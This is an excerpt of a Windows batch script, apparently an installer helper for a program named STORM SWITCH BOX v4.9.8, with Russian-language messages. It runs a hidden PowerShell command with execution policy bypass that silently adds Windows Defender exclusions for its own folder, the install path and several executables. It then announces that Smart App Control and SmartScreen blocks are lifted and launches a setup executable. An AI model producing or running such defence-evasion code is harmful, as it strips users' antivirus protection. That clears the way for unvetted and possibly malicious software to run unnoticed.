...
echo ============================================================
echo   STORM SWITCH BOX v4.9.8 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
...
if not exist "%CERT_FILE%" (
    set "CERT_FILE=%SCRIPT_DIR%installer\Output\STORM_Certificate.cer"
)
...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM SWITCH BOX' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSwitchBox.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SWITCH_BOX_4.9.8_Setup.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormInstaller.exe' -ErrorAction SilentlyContinue" >nul 2>&1
echo   [OK] Папка и исполняемые файлы добавлены в исключения Защитника Windows.
echo.

:: ============================================================
:: 6. Запуск установщика или программы
:: ============================================================
echo [5/5] Запуск STORM SWITCH BOX v4.9.8
echo ============================================================
echo.
echo Все блокировки Smart App Control и SmartScreen сняты!
echo.

if exist "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.9.8_Setup.exe" (
    start "" "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.9.8_Setup.exe"
) else if exist "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.9.8_Setup.exe" (
    start "" "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.9.8_Setup.exe"
) else if exist "%SCRIPT_DIR%STORM_SWITCH_BOX_4.9.8_Setup.exe" (
    start "" "%SCRIPT_DIR%STORM_SWITCH_BOX_4.9.8_Setup.exe"
) else if exist "%SCRIPT_DIR%StormSwitchBox.exe" (
    start "" "%SCRIPT_DIR%StormSwitchBox.exe"
) else (
    echo Программа готова к запуску.
)
exit /b
